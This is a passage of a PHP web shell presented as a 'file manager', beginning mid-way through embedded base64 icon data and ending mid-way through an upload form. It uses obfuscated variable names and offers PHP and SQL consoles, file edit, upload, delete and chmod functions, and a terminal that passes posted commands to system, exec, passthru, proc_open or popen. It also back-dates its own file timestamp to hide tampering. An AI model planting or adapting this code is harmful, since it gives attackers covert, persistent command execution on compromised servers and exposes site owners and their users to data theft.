JnrCygIU406K/qbrbP3Vxb/qjD8+OSNtC+VX6RiUyrWpXJD2aenfyR3Xs9N3h5rFIw6EAYQxsAIKMFx+cfSg0dmFk+qJaQyGu0tvwT2KwEZhANQWZGVg3LS83eupM2F5yiDkE9wDPZ762vQfVUJhIKQ7TDaW8TiacCO2lNnd6xjlYvpm49f5FuNZ+XBxpon5BTfWqSzN4AELAFLq+wSbILFdXgguoibUj7+vu0RKG9jeYHk6uIEXIosQZZiNWYuQSQQTWFuYEV3acXTfwdxitKrQAwumYiYO3JzCkVTyDWwsg+DVZR9YNTL3nqNDnHxNBq2f1mc2I1AgnAIRRfGbVQOamenyQ7ay74sI3z+FWWH9aiOrlCFBOaqqLoIyijw+YWHW9u+CKbGsIc0/s2X0bFpHMNUEuKZVQC/2x0mM00P8idfAAetz2ETwG5fa87PnosuhYBOyo8cttMJW+83dlv/tIl3F+b4CYyp2Txw2VUwAAAAAElFTkSuQmCC");
}

.file {
    background-image: url("data:image/png;base64,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");
}
<?=fm_home_style()?>
.img {
	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");
}
@media screen and (max-width:720px){
  table{display:block;}
    #fm_table td{display:inline;float:left;}
    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}
    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}
    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}
	#header_table table td {display:inline;float:left;}
}
</style>
</head>
<body>
<?php
$qqqqq='?fm=true';if(isset($_POST['sqlrun'])&&!empty($p['enable_sql_console'])){$nn=empty($_POST['sql'])?'':$_POST['sql'];$rrrrr='sql';}elseif(isset($_POST['phprun'])&&!empty($p['enable_php_console'])){$nn=empty($_POST['php'])?'':$_POST['php'];$rrrrr='php';}if(isset($_GET['fm_settings'])){echo ' 
<table class="whole">
<form method="post" action="">
<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
'.(empty($h)?'':'<tr><td class="row2" colspan="2">'.$h.'</td></tr>').'
'.fm_config_checkbox_row(__('Show size of the folder'),'show_dir_size').'
'.fm_config_checkbox_row(__('Show').' '.__('pictures'),'show_img').'
'.fm_config_checkbox_row(__('Show').' '.__('Make directory'),'make_directory').'
'.fm_config_checkbox_row(__('Show').' '.__('New file'),'new_file').'
'.fm_config_checkbox_row(__('Show').' '.__('Upload'),'upload_file').'
'.fm_config_checkbox_row(__('Show').' PHP version','show_php_ver').'
'.fm_config_checkbox_row(__('Show').' PHP ini','show_php_ini').'
'.fm_config_checkbox_row(__('Show').' '.__('Generation time'),'show_gt').'
'.fm_config_checkbox_row(__('Show').' xls','show_xls').'
'.fm_config_checkbox_row(__('Show').' PHP '.__('Console'),'enable_php_console').'
'.fm_config_checkbox_row(__('Show').' SQL '.__('Console'),'enable_sql_console').'
<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$p['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$p['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>
<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$p['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$p['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>
'.fm_config_checkbox_row(__('Show').' Proxy','enable_proxy').'
'.fm_config_checkbox_row(__('Show').' phpinfo()','show_phpinfo').'
'.fm_config_checkbox_row(__('Show').' '.__('Settings'),'fm_settings').'
'.fm_config_checkbox_row(__('Restore file time after editing'),'restore_time').'
'.fm_config_checkbox_row(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'
<tr><td class="row3"><a href="'.fm_url().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>
</form>
</table>
<table>
<form method="post" action="">
<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($q['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
<tr><td class="row1"><input name="fm_login[login]" value="'.$q['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>
<tr><td class="row1"><input name="fm_login[password]" value="'.$q['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>
<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$q['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$q['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$q['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
</form>
</table>';echo fm_tpl_form('php'),fm_tpl_form('sql');}elseif(isset($ooooo)){die($ooooo);}elseif(isset($rrrrr)){?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$d?></th>
</tr>
<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($rrrrr)?> <?=__('Console')?><?php
 if($rrrrr=='sql')echo ' - Database: '.$p['sql_db'].'</h2></td><td>'.fm_run_input('php');else echo '</h2></td><td>'.fm_run_input('sql');?></td></tr></table></td>
</tr>
<tr>
    <td class="row1">
		<a href="<?=$qqqqq.'&path='.$d;?>"><?=__('Back')?></a>
		<form action="" method="POST" name="console">
		<textarea name="<?=$rrrrr?>" cols="80" rows="10" style="width: 90%"><?=$nn?></textarea><br/>
		<input type="reset" value="<?=__('Reset')?>">
		<input type="submit" value="<?=__('Submit')?>" name="<?=$rrrrr?>run">
<?php
$sssss=$rrrrr.'_templates';$ttttt=!empty($$sssss)?json_decode($$sssss,true):'';if(!empty($ttttt)){$uuuuu=isset($_POST[$rrrrr.'_tpl'])?$_POST[$rrrrr.'_tpl']:'';$vvvvv='<select name="'.$rrrrr.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$rrrrr.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$rrrrr.'\'].value =\'\';" >'."\n";$vvvvv.='<option value="-1">'.__('Select')."</option>\n";foreach($ttttt as $wwwww=>$qqqq){$vvvvv.='<option value="'.$qqqq.'" '.((!empty($qqqq)&&($qqqq==$uuuuu))?'selected':'').' >'.__($wwwww)."</option>\n";}$vvvvv.="</select>\n";echo $vvvvv;}?>
		</form>
	</td>
</tr>
</table>
<?php
 if(!empty($nn)){$xxxxx='fm_'.$rrrrr;echo '<h3>'.strtoupper($rrrrr).' '.__('Result').'</h3><pre>'.$xxxxx($nn).'</pre>';}}elseif(!empty($_REQUEST['edit'])){if(!empty($_REQUEST['save'])){$yyyyy=$d.$_REQUEST['edit'];$kkkkk=filemtime($yyyyy);if(file_put_contents($yyyyy,$_REQUEST['newcontent']))$h.=__('File updated');else $h.=__('Error occurred');if($_GET['edit']==basename(__FILE__)){touch(__FILE__,1415116371);}else{if(!empty($p['restore_time']))touch($yyyyy,$kkkkk);}}$zzzzz=@file_get_contents($d.$_REQUEST['edit']);$aaaaaa=$qqqqq.'&edit='.$_REQUEST['edit'].'&path='.$d;$bbbbbb=$qqqqq.'&path='.$d;?>
<table border='0' cellspacing='0' cellpadding='1' width="100%">
<tr>
    <th><?=__('File manager').' - '.__('Edit').' - '.$d.$_REQUEST['edit']?></th>
</tr>
<tr>
    <td class="row1">
        <?=$h?>
	</td>
</tr>
<tr>
    <td class="row1">
        <?=fm_home()?> <a href="<?=$bbbbbb?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$aaaaaa?>">
            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($zzzzz)?></textarea>
            <input type="submit" name="save" value="<?=__('Submit')?>">
            <input type="submit" name="cancel" value="<?=__('Cancel')?>">
        </form>
    </td>
</tr>
</table>
<?php
echo $q['script'];}elseif(!empty($_REQUEST['rights'])){if(!empty($_REQUEST['save'])){if(fm_chmod($d.$_REQUEST['rights'],fm_convert_rights($_REQUEST['rights_val']),@$_REQUEST['recursively']))$h.=(__('File updated'));else $h.=(__('Error occurred'));}clearstatcache();$cccccc=fm_rights_string($d.$_REQUEST['rights'],true);$eee=$qqqqq.'&rights='.$_REQUEST['rights'].'&path='.$d;$bbbbbb=$qqqqq.'&path='.$d;?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$d?></th>
</tr>
<tr>
    <td class="row1">
        <?=$h?>
	</td>
</tr>
<tr>
    <td class="row1">
        <a href="<?=$bbbbbb?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$eee?>">
           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$cccccc?>">
        <?php if(is_dir($d.$_REQUEST['rights'])){?>
            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>
        <?php }?>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>
</table>
<?php
}elseif(!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.'){if(!empty($_REQUEST['save'])){rename($d.$_REQUEST['rename'],$d.$_REQUEST['newname']);$h.=(__('File updated'));$_REQUEST['rename']=$_REQUEST['newname'];}clearstatcache();$eee=$qqqqq.'&rename='.$_REQUEST['rename'].'&path='.$d;$bbbbbb=$qqqqq.'&path='.$d;?>
<table class="whole">
<tr>
    <th><?=__('File manager').' - '.$d?></th>
</tr>
<tr>
    <td class="row1">
        <?=$h?>
	</td>
</tr>
<tr>
    <td class="row1">
        <a href="<?=$bbbbbb?>"><?=__('Back')?></a>
	</td>
</tr>
<tr>
    <td class="row1" align="center">
        <form name="form1" method="post" action="<?=$eee?>">
            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>
            <input type="submit" name="save" value="<?=__('Submit')?>">
        </form>
    </td>
</tr>
</table>
<?php
}else{$h='';if(!empty($_FILES['upload'])&&!empty($p['upload_file'])){if(!empty($_FILES['upload']['name'])){$_FILES['upload']['name']=str_replace('%','',$_FILES['upload']['name']);if(!move_uploaded_file($_FILES['upload']['tmp_name'],$d.$_FILES['upload']['name'])){$h.=__('Error occurred');}else{$h.=__('Files uploaded').': '.$_FILES['upload']['name'];}}}elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.'){if(!fm_del_khumfail(($d.$_REQUEST['delete']),true)){$h.=__('Error occurred');}else{$h.=__('Deleted').' '.$_REQUEST['delete'];}}elseif(!empty($_REQUEST['mkdir'])&&!empty($p['make_directory'])){if(!@mkdir($d.$_REQUEST['dirname'],0777)){$h.=__('Error occurred');}else{$h.=__('Created').' '.$_REQUEST['dirname'];}}elseif(!empty($_POST['search_recursive'])){ini_set('max_execution_time','0');$dddddd=find_text_in_khumfail($_POST['path'],$_POST['mask'],$_POST['search_recursive']);if(!empty($dddddd)){$h.=__('Found in khumfail').' ('.count($dddddd).'):<br>';foreach($dddddd as $ccc){$h.='<a href="'.thangweb(true).'?fm=true&edit='.basename($ccc).'&path='.str_replace('/'.basename($ccc),'/',$ccc).'" title="'.__('Edit').'">'.basename($ccc).'</a>&nbsp; &nbsp;';}}else{$h.=__('Nothing founded');}}elseif(!empty($_REQUEST['mkfile'])&&!empty($p['new_file'])){if(!$pp=@fopen($d.$_REQUEST['filename'],"w")){$h.=__('Error occurred');}else{fclose($pp);$h.=__('Created').' '.$_REQUEST['filename'];}}elseif(isset($_GET['zip'])){$eeeeee=base64_decode($_GET['zip']);$ffffff=basename($eeeeee).'.zip';set_time_limit(0);$gggggg=new PharData($ffffff);$gggggg->buildFromDirectory($eeeeee);if(is_file($ffffff))$h.=__('Task').' "'.__('Archiving').' '.$ffffff.'" '.__('done').'.&nbsp;'.rangkhwampanithan('download',$d.$ffffff,__('Download'),__('Download').' '.$ffffff).'&nbsp;<a href="'.$qqqqq.'&delete='.$ffffff.'&path='.$d.'" title="'.__('Delete').' '.$ffffff.'" >'.__('Delete').'</a>';else $h.=__('Error occurred').': '.__('no khumfail');}elseif(isset($_GET['gz'])){$eeeeee=base64_decode($_GET['gz']);$hhhhhh=$eeeeee.'.tar';$ffffff=basename($eeeeee).'.tar';if(is_file($hhhhhh))unlink($hhhhhh);if(is_file($hhhhhh.'.gz'))unlink($hhhhhh.'.gz');clearstatcache();set_time_limit(0);$gggggg=new PharData($ffffff);$gggggg->buildFromDirectory($eeeeee);$gggggg->compress(Phar::GZ,'.tar.gz');unset($gggggg);if(is_file($hhhhhh)){if(is_file($hhhhhh.'.gz')){unlink($hhhhhh);$ffffff.='.gz';}$h.=__('Task').' "'.__('Archiving').' '.$ffffff.'" '.__('done').'.&nbsp;'.rangkhwampanithan('download',$d.$ffffff,__('Download'),__('Download').' '.$ffffff).'&nbsp;<a href="'.$qqqqq.'&delete='.$ffffff.'&path='.$d.'" title="'.__('Delete').' '.$ffffff.'" >'.__('Delete').'</a>';}else $h.=__('Error occurred').': '.__('no khumfail');}elseif(isset($_GET['decompress'])){}elseif(isset($_GET['gzfile'])){$eeeeee=base64_decode($_GET['gzfile']);$hhhhhh=$eeeeee.'.tar';$ffffff=basename($eeeeee).'.tar';if(is_file($hhhhhh))unlink($hhhhhh);if(is_file($hhhhhh.'.gz'))unlink($hhhhhh.'.gz');set_time_limit(0);$iiiiii=explode('.',basename($eeeeee));if(isset($iiiiii[1])){unset($iiiiii[0]);$nnnnn=implode('.',$iiiiii);}$gggggg=new PharData($ffffff);$gggggg->addFile($eeeeee);$gggggg->compress(Phar::GZ,$nnnnn.'.tar.gz');unset($gggggg);if(is_file($hhhhhh)){if(is_file($hhhhhh.'.gz')){unlink($hhhhhh);$ffffff.='.gz';}$h.=__('Task').' "'.__('Archiving').' '.$ffffff.'" '.__('done').'.&nbsp;'.rangkhwampanithan('download',$d.$ffffff,__('Download'),__('Download').' '.$ffffff).'&nbsp;<a href="'.$qqqqq.'&delete='.$ffffff.'&path='.$d.'" title="'.__('Delete').' '.$ffffff.'" >'.__('Delete').'</a>';}else $h.=__('Error occurred').': '.__('no khumfail');}?>
<table class="whole" id="header_table" >
<tr>
    <th colspan="2"><?=__('File manager')?><?=(!empty($d)?' - '.$d:'')?></th>
</tr>
<?php if(!empty($h)){?>
<tr>
	<td colspan="2" class="row2"><?=$h?></td>
</tr>
<?php }?>
<tr>
    <td class="row2">
		<table>
			<tr>
			<td>
				<?=fm_home()?>
			</td>
			<td>
<?php
session_start();$jjjjjj=['passthru','system','exec','shell_exec','proc_open','popen','symlink','dl'];$kkkkkk=false;foreach($jjjjjj as $aaa){if(function_exists($aaa)){$kkkkkk=true;break;}}if(!isset($_SESSION['cwd'])){$_SESSION['cwd']=getcwd();}if(isset($_POST['path'])&&is_dir($_POST['path'])){$_SESSION['cwd']=realpath($_POST['path']);}$llllll=$_SESSION['cwd'];$mmmmmm="";if(isset($_POST['terminal'])){$nnnnnn=trim($_POST['terminal-text']);if(preg_match('/^cd\s*(.*)$/',$nnnnnn,$tttt)){$yy=trim($tttt[1]);if($yy===''||$yy==='~'){$yy=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:$llllll;}elseif($yy[0]!==DIRECTORY_SEPARATOR&&$yy[0]!=='/'&&$yy[0]!=='\\'){$yy=$llllll.DIRECTORY_SEPARATOR.$yy;}$oooooo=realpath($yy);if($oooooo&&is_dir($oooooo)){$_SESSION['cwd']=$oooooo;$llllll=$oooooo;$mmmmmm="Changed directory to ".htmlspecialchars($oooooo);}else{$mmmmmm="bash: cd: ".htmlspecialchars($tttt[1]).": No such file or directory";}}else{if($kkkkkk){chdir($llllll);$pppppp=$nnnnnn." 2>&1";if(function_exists('passthru')){ob_start();passthru($pppppp);$mmmmmm=ob_get_clean();}elseif(function_exists('system')){ob_start();system($pppppp);$mmmmmm=ob_get_clean();}elseif(function_exists('exec')){exec($pppppp,$qqqqqq);$mmmmmm=implode("\n",$qqqqqq);}elseif(function_exists('shell_exec')){$mmmmmm=shell_exec($pppppp);}elseif(function_exists('proc_open')){$rrrrrr=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];$ssssss=proc_open($pppppp,$rrrrrr,$tttttt,$llllll);if(is_resource($ssssss)){fclose($tttttt[0]);$mmmmmm=stream_get_contents($tttttt[1]);fclose($tttttt[1]);$mmmmmm.=stream_get_contents($tttttt[2]);fclose($tttttt[2]);proc_close($ssssss);}else{$mmmmmm="Failed to execute command via proc_open.";}}elseif(function_exists('popen')){$hhhh=popen($pppppp,'r');if($hhhh){$mmmmmm=stream_get_contents($hhhh);pclose($hhhh);}else{$mmmmmm="Failed to execute command via popen.";}}else{$mmmmmm="Error: No command execution functions available.";}}else{$mmmmmm="Command execution functions are disabled on this server. Terminal is unavailable.";}}}if(!isset($qqqqq))$qqqqq=htmlspecialchars($_SERVER['PHP_SELF']);if(!isset($d))$d=$llllll;?>

<strong>root@Sid-Gifari:<?php echo htmlspecialchars($llllll);?>$</strong><br>
<pre><?php echo htmlspecialchars($mmmmmm);?></pre>

<form method="post" action="<?php echo $qqqqq;?>">
    <input type="text" name="terminal-text" size="30" placeholder="Cmd">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($d);?>" />
    <input type="submit" name="terminal" value="Execute">
</form>
</td>
			<td>
			<?php if(!empty($p['make_directory'])){?>
				<form method="post" action="<?=$qqqqq?>">
				<input type="hidden" name="path" value="<?=$d?>" />
				<input type="text" name="dirname" size="15">
				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
				</form>
			<?php }?>
			</td>
			<td>
			<?php if(!empty($p['new_file'])){?>
				<form method="post" action="<?=$qqqqq?>">
				<input type="hidden" name="path"     value="<?=$d?>" />
				<input type="text"   name="filename" size="15">
				<input type="submit" name="mkfile"   value="<?=__('New file')?>">
				</form>
			<?php }?>
			</td>
			<td>
				<form  method="post" action="<?=$qqqqq?>" style="display:inline">
				<input type="hidden" name="path" value="<?=$d?>" />
				<input type="text" placeholder="<?=__('Recursive search')?>" name="search_recursive" value="<?=!empty($_POST['search_recursive'])?$_POST['search_recursive']:''?>" size="15">
				<input type="text" name="mask" placeholder="<?=__('Mask')?>" value="<?=!empty($_POST['mask'])?$_POST['mask']:'*.*'?>" size="5">
				<input type="submit" name="search" value="<?=__('Search')?>">
				</form>
			</td>
			<td>
			<?=fm_run_input('php')?>
			</td>
			<td>
			<?=fm_run_input('sql')?>
			</td>
			</tr>
		</table>
    </td>
    <td class="row3">
		<table>
		<tr>
		     <td>

		     <?php if(!empty($p['upload_file'])){?>
                      
		     	<form name="form1" method="post" action="<?=$qqqqq?>" enctype="multipart/form-data">
                    
		     	<input type="hidden" name="path" value="<?=$d?>" />

		     	<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />

